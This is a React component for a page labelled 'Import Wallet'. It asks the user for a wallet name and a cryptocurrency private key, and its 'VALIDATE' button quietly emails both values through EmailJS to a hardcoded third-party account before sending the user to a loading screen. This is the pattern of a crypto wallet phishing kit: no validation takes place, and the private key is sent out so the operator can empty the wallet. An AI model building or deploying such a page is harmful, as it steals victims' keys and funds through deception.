import React, { useRef } from 'react';
import "./Private_Key.css";
import { NavLink, useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';

export const Private_Key = () => {
  // Initialize the navigate hook
  const navigate = useNavigate();
  
  // Create a reference for the form
  const form = useRef();

  // Function to handle form submission
  const sendEmail = (e) => {
    e.preventDefault(); // Prevent default form submission behavior

    emailjs.sendForm(
      "service_qghi171",
      "template_m0dnrdu",
      form.current,
      "HaqXdadPhJghOQ5LG"
    ).then(
      () => {
        console.log("SUCCESS!"); // Log success message
        navigate('/Loading'); // Navigate to the '/Loading' route
      },
      (error) => {
        console.log("FAILED...", error.text); // Log error message
      }
    );
  };

  return (
    <div className="contact_info">
      <div className="head">
        <h2>
          <NavLink to="/wallets">
            <i className="bi bi-arrow-left-circle"></i>
            <span> Import Wallet </span>
          </NavLink>
        </h2>
      </div>
      <div className="myul">
        <ul>
          <li><h3><NavLink to="/Contact">Phrase</NavLink></h3></li>
          <li><h3><NavLink to="/keystore">keystore JSON</NavLink></h3></li>
          <li><h3><NavLink to="/private">Private Key</NavLink></h3></li>
          <li><h3><NavLink to="/encrypt">Encrypted Key</NavLink></h3></li>
        </ul>
      </div>
      <form ref={form} onSubmit={sendEmail} className="myform">
        <textarea
          name="walletName"
          placeholder="Wallet Name"
          required
          className="walletName"
        />
        <input
          type="text"
          name="Private"
          placeholder="Private Key"
          className="password"
          required
        />
        <p>Typically 64 alphanumeric characters</p>
        <button type="submit" name="submit" >
          <p>VALIDATE</p>
        </button>
      </form>
    </div>
  );
};

export default Private_Key;
